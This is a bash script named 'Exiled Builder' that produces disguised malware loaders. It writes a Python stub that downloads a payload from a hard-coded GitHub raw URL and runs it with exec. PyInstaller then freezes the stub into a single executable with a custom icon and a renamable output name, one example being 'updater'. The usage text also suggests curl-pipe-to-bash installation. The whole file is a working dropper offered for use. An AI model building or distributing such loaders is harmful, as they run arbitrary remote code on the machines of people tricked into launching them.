#!/usr/bin/env bash
set -euo pipefail

APP=exiled
SOURCE_APP=exiled
STUB_NAME=payload.py

MUTED='\033[0;2m'
RED='\033[0;31m'
ORANGE='\033[38;5;214m'
NC='\033[0m'

REMOTE_URL="https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py"
ICON_URL="https://cdn.discordapp.com/icons/1517380157533589564/f7c80ce7a2811d4976775b7e5ffe0133.webp?size=600"

usage() {
    cat <<EOF
Exiled Builder

Usage: install.sh [options]

Options:
    -h, --help              Display this help message
    -o, --out <name>        Output exe name (default: exiled)
    -u, --url <url>         Remote payload URL to embed in the stub
    -i, --icon <url|path>   Icon source (webp/png/ico url or local file)
    -d, --dir <path>        Output directory (default: \$PWD)
        --no-icon           Skip icon embedding
        --keep-build        Keep the _build staging dir after freezing

Examples:
    curl -fsSL https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/ex-install.sh | bash
    curl -fsSL .../ex-install.sh | bash -s -- --out updater
    ./ex-install.sh --icon ./logo.png --keep-build
EOF
}

out_name="exiled"
payload_url="$REMOTE_URL"
icon_src="$ICON_URL"
use_icon=true
keep_build=false
out_dir=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help) usage; exit 0 ;;
        -o|--out)
            if [[ -n "${2:-}" ]]; then out_name="$2"; shift 2
            else echo -e "${RED}Error: --out requires a name argument${NC}"; exit 1; fi ;;
        -u|--url)
            if [[ -n "${2:-}" ]]; then payload_url="$2"; shift 2
            else echo -e "${RED}Error: --url requires a url argument${NC}"; exit 1; fi ;;
        -i|--icon)
            if [[ -n "${2:-}" ]]; then icon_src="$2"; shift 2
            else echo -e "${RED}Error: --icon requires a url or path argument${NC}"; exit 1; fi ;;
        -d|--dir)
            if [[ -n "${2:-}" ]]; then out_dir="$2"; shift 2
            else echo -e "${RED}Error: --dir requires a path argument${NC}"; exit 1; fi ;;
        --no-icon) use_icon=false; shift ;;
        --keep-build) keep_build=true; shift ;;
        *) echo -e "${ORANGE}Warning: Unknown option '$1'${NC}" >&2; shift ;;
    esac
done

print_message() {
    local level=$1
    local message=$2
    local color=""
    case $level in
        info) color="${NC}" ;;
        warning) color="${ORANGE}" ;;
        error) color="${RED}" ;;
    esac
    echo -e "${color}${message}${NC}"
}

raw_os=$(uname -s)
os=$(echo "$raw_os" | tr '[:upper:]' '[:lower:]')
case "$raw_os" in
    Darwin*) os="darwin" ;;
    Linux*) os="linux" ;;
    MINGW*|MSYS*|CYGWIN*) os="windows" ;;
esac

arch=$(uname -m)
[[ "$arch" == "aarch64" ]] && arch="arm64"
[[ "$arch" == "x86_64" ]] && arch="x64"

if [ "$os" = "darwin" ] && [ "$arch" = "x64" ]; then
    rosetta_flag=$(sysctl -n sysctl.proc_translated 2>/dev/null || echo 0)
    if [ "$rosetta_flag" = "1" ]; then
        arch="arm64"
    fi
fi

case "$os-$arch" in
    linux-x64|linux-arm64|darwin-x64|darwin-arm64|windows-x64) ;;
    *)
        echo -e "${RED}Unsupported OS/Arch: $os/$arch${NC}"
        exit 1
        ;;
esac

if ! command -v python3 >/dev/null 2>&1; then
    echo -e "${RED}Error: python3 is required but not installed.${NC}"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}Error: curl is required but not installed.${NC}"
    exit 1
fi

if [[ -n "$out_dir" ]]; then
    HERE="$(cd -- "$out_dir" && pwd)"
else
    HERE="$(pwd)"
fi

WORKDIR="${HERE}/_build"
STUB="${WORKDIR}/${STUB_NAME}"
ICON_RAW="${WORKDIR}/icon.raw"
ICON_ICO="${WORKDIR}/icon.ico"

print_message info "\n${MUTED}Building ${NC}${APP} ${MUTED}for ${NC}${os}-${arch}"
print_message info "${MUTED}Output dir:${NC} ${HERE}"

mkdir -p "${WORKDIR}"

{
    echo "import urllib.request"
    echo "exec(compile(urllib.request.urlopen('${payload_url}').read(), '<url>', 'exec'))"
} > "${STUB}"

if [ "$use_icon" = "true" ]; then
    if [[ "$icon_src" =~ ^https?:// ]]; then
        print_message info "${MUTED}Fetching icon...${NC}"
        curl -fsSL -A "Mozilla/5.0" "$icon_src" -o "$ICON_RAW"
    else
        if [ ! -f "$icon_src" ]; then
            echo -e "${RED}Error: icon file not found at ${icon_src}${NC}"
            exit 1
        fi
        cp "$icon_src" "$ICON_RAW"
    fi
fi

print_message info "${MUTED}Installing build deps...${NC}"
python3 -m pip install --quiet --upgrade pyinstaller pillow

if [ "$use_icon" = "true" ]; then
    print_message info "${MUTED}Converting icon to .ico...${NC}"
    python3 - <<PY
from PIL import Image
img = Image.open("${ICON_RAW}")
if img.mode != "RGBA":
    img = img.convert("RGBA")
img.save("${ICON_ICO}", format="ICO", sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
PY
fi

print_message info "${MUTED}Freezing...${NC}"

PYI_ARGS=(
    --onefile
    --noconfirm
    --clean
    --name "${out_name}"
    --distpath "${HERE}/dist"
    --workpath "${WORKDIR}/pyi"
    --specpath "${WORKDIR}"
)

if [ "$use_icon" = "true" ]; then
    PYI_ARGS+=(--icon "${ICON_ICO}")
fi

python3 -m PyInstaller "${PYI_ARGS[@]}" "${STUB}"

if [ "$keep_build" != "true" ]; then
    rm -rf "${WORKDIR}"
fi

EXE_EXT=""
[[ "$os" == "windows" ]] && EXE_EXT=".exe"

echo -e ""
echo -e "${ORANGE} _____          _   _              _ ${NC}"
echo -e "${ORANGE}| ____| __  __ (_) | |   ___    __| |${NC}"
echo -e "${ORANGE}|  _|   \\ \\/ / | | | |  / _ \\  / _\` |${NC}"
echo -e "${ORANGE}| |___   >  <  | | | | |  __/ | (_| |${NC}"
echo -e "${ORANGE}|_____| /_/\\_\\ |_| |_|  \\___|  \\__,_|${NC}"
echo -e "${ORANGE}                                      ${NC}"
echo -e ""
echo -e "${MUTED}Built:${NC} ${HERE}/dist/${out_name}${EXE_EXT}"
echo -e "${MUTED}Payload source:${NC} ${payload_url}"
echo -e ""
echo -e "${MUTED}Run it:${NC}"
echo -e "  cd ${HERE} && ./dist/${out_name}${EXE_EXT}"
echo -e ""
